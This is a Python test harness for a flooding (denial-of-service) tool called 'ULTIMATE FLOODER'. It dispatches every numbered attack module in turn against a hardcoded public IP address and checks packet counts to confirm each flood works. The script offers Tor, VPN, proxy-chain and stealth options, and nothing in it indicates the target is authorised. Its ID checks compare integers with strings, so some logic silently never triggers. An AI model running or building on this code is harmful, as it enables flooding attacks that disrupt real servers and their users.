import time
import threading
import asyncio
from src.core.dispatcher import AttackDispatcher
from src.core.menu import Menu
from src.config import CONFIG
from src.utils.logging import add_system_log

# Target for testing
TARGET_URL = "http://203.154.83.24/"
TARGET_IP = "203.154.83.24"
DURATION = 5  # Slightly longer for better verification
THREADS = 10

class MockMonitor:
    def __init__(self):
        self.packets_sent = 0
        self.bytes_sent = 0
        self.failed = 0
        self._lock = threading.Lock()

    def update_stats(self, packets=0, bytes_sent=0, failed=0):
        with self._lock:
            self.packets_sent += packets
            self.bytes_sent += bytes_sent
            self.failed += failed

def test_single_id(choice):
    attack_name = Menu.ATTACKS.get(str(choice), {}).get("name", "Unknown")
    print(f"\n[!] INITIATING TEST: ID {choice} - {attack_name}")
    
    # Classification for target type
    target = TARGET_URL if choice in ["1", "2", "5", "8", "12", "13", "14", "15", "16", "22", "23", "32", "33", "34"] else TARGET_IP
    
    params = {
        "target": target,
        "port": 80,
        "threads": THREADS,
        "duration": DURATION,
        "max_requests": 0,
        "proxies": [],
        "use_tor": False,
        "stealth_mode": False,
        "use_vpn": False,
        "use_proxy_chain": False
    }

    monitor = MockMonitor()

    try:
        # Skip management/interactive IDs during automated test
        if choice in ["0", "7", "18", "26", "29", "30"]:
            print(f"[-] ID {choice} is interactive/management. Skipping.")
            return True

        print(f"[*] Dispatching attack...")
        AttackDispatcher.execute(str(choice), params, monitor=monitor)
        
        # Wait for execution window
        for i in range(DURATION + 1):
            time.sleep(1)
            if monitor.packets_sent > 0 or monitor.bytes_sent > 0:
                print(f"    -> Running... Sent: {monitor.packets_sent} pkts")
            elif monitor.failed > 0:
                print(f"    -> [!] Failures detected: {monitor.failed}")

        if monitor.packets_sent > 0 or monitor.bytes_sent > 0:
            print(f"[✓] ID {choice} SUCCESS: Activity recorded.")
            return True
        else:
            print(f"[?] ID {choice} WARNING: No activity recorded (or requires root/special env).")
            return False

    except Exception as e:
        print(f"[✗] ID {choice} ERROR: {str(e)}")
        return False

def main():
    print("==================================================")
    print("   ULTIMATE FLOODER - FULL DIAGNOSTIC TEST       ")
    print(f"   Target: {TARGET_URL}")
    print("==================================================")
    
    results = {}
    ids = sorted([int(k) for k in Menu.ATTACKS.keys() if k.isdigit()])
    
    for attack_id in ids:
        if attack_id >= 1:
            success = test_single_id(attack_id)
            results[attack_id] = success
            time.sleep(1) # Small cooldown between tests

    print("\n\n" + "="*50)
    print("               TESTING SUMMARY")
    print("="*50)
    passed = [id for id, res in results.items() if res]
    failed = [id for id, res in results.items() if not res]
    
    print(f"Total IDs Tested: {len(results)}")
    print(f"Passed/Skipped: {len(passed)}")
    print(f"Failed/No Activity: {len(failed)}")
    
    if failed:
        print(f"Failed IDs: {failed}")
    print("="*50)

if __name__ == "__main__":
    main()
